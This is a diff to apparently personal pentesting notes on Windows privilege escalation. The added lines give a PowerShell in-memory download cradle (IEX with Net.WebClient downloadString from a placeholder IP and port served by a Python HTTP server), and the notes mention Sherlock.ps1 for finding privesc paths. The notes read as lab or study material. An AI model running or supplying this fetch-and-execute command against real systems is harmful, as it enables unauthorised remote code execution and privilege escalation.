@@ -1,5 +1,8 @@
 Include invoke expression (can be an example from the script) on the bottom to run it as soon as the whole thing is invoked
 
+download into memory using powershell can be invoked after (needs to be hosted on python httpserver)
+IEX(New-Object Net.WebClient).downloadString('http://IP:port/file.ps1')
+
 Sherlock.ps1 script to check for privesc paths
 
 powershell paths
